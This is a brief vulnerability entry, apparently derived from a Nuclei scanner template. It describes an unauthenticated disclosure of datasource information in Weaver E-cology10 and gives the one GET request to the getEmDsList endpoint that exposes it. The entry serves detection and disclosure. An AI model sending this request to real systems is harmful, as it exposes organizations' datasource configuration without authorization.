# Vulnerability: Weaver E-cology getEmDsList Sensitive Information Disclosure
**Classification:** WEAVER
**Source:** Nuclei Template (`weaver-getemdslist-disclosure.yaml`)

## Description
Weaver E-cology10 contains a sensitive information disclosure vulnerability in the `/papi/em/transform/getEmDsList` endpoint. An unauthenticated attacker can access the endpoint to retrieve datasource-related information such as `dsKey`, `dsValue`, and `deleteType`.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/papi/em/transform/getEmDsList
```

